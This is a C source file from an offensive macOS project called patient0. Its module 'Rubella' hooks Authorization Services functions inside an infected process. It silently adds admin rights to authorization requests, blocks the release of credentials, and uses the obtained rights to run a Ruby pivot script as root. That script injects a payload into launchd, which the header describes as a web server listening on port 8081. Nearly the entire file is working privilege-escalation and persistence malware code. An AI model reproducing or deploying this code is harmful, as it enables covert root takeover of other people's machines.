/* rubella.c: patient0 pathogen for passive root privilege acquisition
 *
 * Once a process is infected with Rubella, it will performs all operations
 * normally exception wen accessing the Authorization Services from the
 * Security framework.  Rubella intercepts calls to the following functions:
 * - AuthorizationCopyRights, AuthorizationCreate: to get system.privilege.admin
 * - AuthorizationFree: disables credential dropping
 * - AuthorizationExecuteWithPrivileges is, at present, only traced.
 * Once an authorization reference has system.privilege.admin rights,
 * Rubella can run pivot.rb as root (without writing to the filesystem)
 * and inject its payload into pid 1 (launchd).
 *
 * Rubella's payload is a lightweight Tcl web server that runs on top of
 * tclist.bundle.  It listens on port 8081.
 *
 * TODO: add a disable to stop N threads from being injected into launchd.
 *
 * Copyright (c) 2009 Will Drewry <redpig@dataspill.org>. All rights reserved.
 * Use of this source code is governed by a BSD-style license that can be
 * found in the LICENSE file or at http://github.org/redpig/patient0.
 */

#include <dlfcn.h>
#include <fcntl.h>
#include <stdarg.h>
#include <stdint.h>
#include <stddef.h>
#include <stdbool.h>
#include <string.h>
#include <sys/types.h>
#include <unistd.h>

/* Would be Security/ if we linked to the framework */
#include <Authorization.h>  /* Security.framework */
#include <AuthorizationTags.h>  /* Security.framework */

#include <patient0/log.h>
#include <patient0/mach_jump.h>
#include <patient0/runtime.h>

#include "rerun_rb.h"
#include "pivot_rb.h"
#include "rubella_payload.h"

static void pivot(AuthorizationRef authorization);

typedef OSStatus (*AuthorizationCreate_t)(const AuthorizationRights *,
  const AuthorizationEnvironment *, AuthorizationFlags, AuthorizationRef *);

static OSStatus rubella_AuthorizationCreate(const AuthorizationRights *rights,
  const AuthorizationEnvironment *environment,
  AuthorizationFlags flags,
  AuthorizationRef *authorization) {
  OSStatus result = errAuthorizationInternal;
  AuthorizationCreate_t orig = dlsym(RTLD_DEFAULT, "AuthorizationCreate");
  if (orig) {
    result = orig(rights, environment, flags, authorization);
  }
  p0_logf(P0_INFO, "AuthorizationCreate called");
  return result;
}



OSStatus rubella_AuthorizationFree(AuthorizationRef authorization, AuthorizationFlags flags) {
  p0_logf(P0_INFO, "Ignoring request to release rights");
  return errAuthorizationSuccess;
}

typedef OSStatus (*AuthorizationCopyRights_t)(AuthorizationRef authorization, 
  const AuthorizationRights *,
  const AuthorizationEnvironment *,
  AuthorizationFlags,
  AuthorizationRights **);

OSStatus rubella_AuthorizationCopyRights(AuthorizationRef authorization, 
  const AuthorizationRights *orig_rights, /* will this play nicely? */
  const AuthorizationEnvironment *environment,
  AuthorizationFlags flags,
  AuthorizationRights **authorizedRights) {
  OSStatus result = errAuthorizationInternal;
  AuthorizationCopyRights_t orig = dlsym(RTLD_DEFAULT, "AuthorizationCopyRights");
  AuthorizationRights rights = { 0 };
  AuthorizationItem admin = { kAuthorizationRightExecute, 0, NULL, 0 };
  bool can_extend =  (flags & (kAuthorizationFlagInteractionAllowed |
                               kAuthorizationFlagExtendRights));
  bool has_admin = false;

  if (!orig) {
    p0_logf(P0_INFO, "AuthorizationCopyRights original could not be found.");
   return errAuthorizationInternal;
  }

  p0_logf(P0_INFO, "AuthorizationCopyRights called");
  if (!orig_rights) {
    p0_logf(P0_ERR, "We can't handle NULL rights");
    if (orig) {
      return orig(authorization, orig_rights, environment, flags, authorizedRights);
    } else {
      return result;
    }
  }
  /* if no items were given, we can just slap our own in */
  if (can_extend && orig_rights->count == 0) {
    rights.items = &admin;
    rights.count = 1;
    p0_logf(P0_INFO, "No rights requested. Inserting admin");
    return orig(authorization, &rights, environment, flags, authorizedRights);
  }

  /* If there are rights, let's see if admin is already present */
  if (can_extend && orig_rights->count > 0) {
    AuthorizationItem *item = orig_rights->items;
    uint32_t count = 0;
    p0_logf(P0_INFO, "Checking for admin...");
    for ( ; count < orig_rights->count; ++count, ++item) {
      p0_logf(P0_INFO, "--> %s", item->name);
     if (!strcmp(item->name, kAuthorizationRightExecute)) {
       p0_logf(P0_INFO, "match!");
       has_admin = true;
       break;
     }
    }
  }

  if (!has_admin && !can_extend) {
    p0_logf(P0_INFO, "no admin and non-interactive. bailing");
    return orig(authorization, orig_rights, environment, flags, authorizedRights);
  }

  /* If we need to add admin, we do it now */
  if (!has_admin) {
    uint32_t item_max = orig_rights->count;
    uint32_t count = 0;
    AuthorizationItem *item = orig_rights->items;
    AuthorizationItem *replacement_item;
    p0_logf(P0_INFO, "No system.privilege.admin, so we insert it");
    rights.count = orig_rights->count + 1;
    rights.items = malloc(sizeof(*item) * rights.count);
    replacement_item = rights.items;
    if (!rights.items) {
      p0_logf(P0_ERR, "failed to allocate a new items array");
      return orig(authorization, orig_rights, environment, flags, authorizedRights);
    }
    for ( ; count < item_max; ++count, ++item, ++replacement_item) {
      replacement_item->name = item->name;
      replacement_item->value = item->value;
      replacement_item->valueLength = item->valueLength;
      replacement_item->flags = replacement_item->flags;
      /* memcpy(replacement_item, item, sizeof(item)); */
    }
    rights.items[item_max].name = admin.name;
    rights.items[item_max].value = NULL;
    rights.items[item_max].valueLength = 0;
    rights.items[item_max].flags = admin.flags;
  }

  result = orig(authorization, &rights, environment, flags, authorizedRights);
  /* On success, pivot to root! */
  if (result == errAuthorizationSuccess) {
    pivot(authorization);
  }

  return result;
}
intptr_t acr_ptr = (intptr_t)&rubella_AuthorizationCopyRights;


typedef OSStatus (*AuthorizationCopyInfo_t)(AuthorizationRef,
        AuthorizationString, AuthorizationItemSet **);

OSStatus rubella_AuthorizationCopyInfo(AuthorizationRef authorization, 
        AuthorizationString tag,
        AuthorizationItemSet **info) {
  AuthorizationCopyInfo_t orig = dlsym(RTLD_DEFAULT, "AuthorizationCopyInfo");
  p0_logf(P0_INFO, "called");
  if (!orig)
    return errAuthorizationInternal;
  return orig(authorization, tag, info);
}


typedef OSStatus (*AuthorizationExecuteWithPrivileges_t)(AuthorizationRef,
                                                         const char *,
                                                         AuthorizationFlags,
                                                         char * const *,
                                                         FILE **);
OSStatus rubella_AuthorizationExecuteWithPrivileges(AuthorizationRef authorization,
                                                    const char *path,
                                                    AuthorizationFlags flags,
                                                    char * const *args,
                                                    FILE **commPipe) {
  AuthorizationExecuteWithPrivileges_t orig = dlsym(RTLD_DEFAULT, "AuthorizationExecuteWithPrivileges");
  p0_logf(P0_INFO, "(%s, %d, ...)", path, flags);
  return orig(authorization, path, flags, args, commPipe);
}


static void pivot(AuthorizationRef authorization) {
  FILE *commPipe = NULL;
  char *args[] = { "--", "/dev/fd/1", 0 }; /* we can pass args too */
  AuthorizationExecuteWithPrivileges_t execer = dlsym(RTLD_DEFAULT, "AuthorizationExecuteWithPrivileges");
  p0_logf(P0_INFO, "pivoting");
  if (!execer) {
    p0_logf(P0_ERR, "AuthorizationExecuteWithPrivileges not found");
    return;
  }
  execer(authorization,
         "/usr/bin/ruby",
         kAuthorizationFlagDefaults,
         args,
         &commPipe);
  /* This seems stupidly roundabout, but it works. */

  p0_logf(P0_INFO, "REAL_SCRIPT=String.new(<<'EOF')\n");
  fprintf(commPipe, "REAL_SCRIPT=String.new(<<'EOF')\n");
  p0_logf(P0_INFO, "P=[%s].pack('c*')\n", rubella_payload);
  fprintf(commPipe, "P=[%s].pack('c*')\n", rubella_payload);
  pivot_rb[pivot_rb_len - 1] = '\0';
  p0_logf(P0_INFO, "%s", pivot_rb);
  fprintf(commPipe, "%s", pivot_rb);
  p0_logf(P0_INFO, "EOF\n");
  fprintf(commPipe, "EOF\n");
  rerun_rb[rerun_rb_len - 1] = '\0';
  p0_logf(P0_INFO, "%s\n", rerun_rb);
  fprintf(commPipe, "%s\n", rerun_rb);
  fclose(commPipe);
  p0_logf(P0_INFO, "pivot done.");
}

/* memory should look like:
 * +--------------+
 * | rubella code |
 * +--------------+
 * | args         |
 * +--------------+
 * | uint32 (sz)  |
 * +--------------+
 */
void run(unsigned char *code, uint32_t size) {
  unsigned char *cursor = code + size - sizeof(uint32_t);
  uint32_t args_size = *((uint32_t *)cursor);

  p0_logf(P0_INFO, "rubella running");
  /* install function replacements */
  mach_jump_init();
  if (!mach_jump_patch("AuthorizationFree", rubella_AuthorizationFree)) {
    p0_logf(P0_ERR, "failed to patch AuthorizationFree");
  }
  if (!mach_jump_patch("AuthorizationCreate", rubella_AuthorizationCreate)) {
    p0_logf(P0_ERR, "failed to patch AuthorizationCreate");
  }
  if (!mach_jump_patch("AuthorizationCopyRights",
                      rubella_AuthorizationCopyRights)) {
    p0_logf(P0_ERR, "failed to patch AuthorizationCopyRights");
  }
  if (!mach_jump_patch("AuthorizationExecuteWithPrivileges",
                       rubella_AuthorizationExecuteWithPrivileges)) {
    p0_logf(P0_ERR, "failed to patch AuthorizationExecuteWithPrivileges");
  }
  p0_logf(P0_INFO, "global symbol stubs patched");

  /* We also patch up SecurityFoundation. It is the Objective-C wrapper around
   * the Security framework.  Note, the other option is to use mach_star's
   * mach_override, but unless I have to, I like doing stub fixups.  However,
   * this doesn't give the same guaranteed coverage of mach_override (or
   * clobber_function).
   * TODO: add LC_LOAD_DYLIB crawling to autopatch all loaded symbol stubs and
   * register a function to do the patchup on a subsequent library loads.
   */
  if (!mach_jump_framework_patch("SecurityFoundation",
                                 "AuthorizationFree",
                                 rubella_AuthorizationFree)) {
    p0_logf(P0_ERR, "failed to patch AuthorizationFree");
  }
  if (!mach_jump_framework_patch("SecurityFoundation",
                                "AuthorizationCreate",
                                rubella_AuthorizationCreate)) {
    p0_logf(P0_ERR, "failed to patch AuthorizationCreate");
  }
  if (!mach_jump_framework_patch("SecurityFoundation",
                                "AuthorizationCopyRights",
                                 rubella_AuthorizationCopyRights)) {
    p0_logf(P0_ERR, "failed to patch AuthorizationCopyRights");
  }
  if (!mach_jump_framework_patch("SecurityFoundation",
                                "AuthorizationExecuteWithPrivileges",
                                rubella_AuthorizationExecuteWithPrivileges)) {
    p0_logf(P0_ERR, "failed to patch AuthorizationExecuteWithPrivileges");
  }
  p0_logf(P0_INFO, "SecurityFoundation symbol stubs patched");

  if (!mach_jump_framework_patch("SecurityInterface",
                                 "AuthorizationFree",
                                 rubella_AuthorizationFree)) {
    p0_logf(P0_ERR, "failed to patch AuthorizationFree");
  }
  if (!mach_jump_framework_patch("SecurityInterface",
                                "AuthorizationCreate",
                                rubella_AuthorizationCreate)) {
    p0_logf(P0_ERR, "failed to patch AuthorizationCreate");
  }
  if (!mach_jump_framework_patch("SecurityInterface",
                                "AuthorizationCopyRights",
                                 rubella_AuthorizationCopyRights)) {
    p0_logf(P0_ERR, "failed to patch AuthorizationCopyRights");
  }
  if (!mach_jump_framework_patch("SecurityInterface",
                                "AuthorizationExecuteWithPrivileges",
                                rubella_AuthorizationExecuteWithPrivileges)) {
    p0_logf(P0_ERR, "failed to patch AuthorizationExecuteWithPrivileges");
  }
  p0_logf(P0_INFO, "SecurityInterface symbol stubs patched");

  p0_logf(P0_INFO, "rubella patching complete");
  /* hang this thread */
  runtime_deadlock();
}
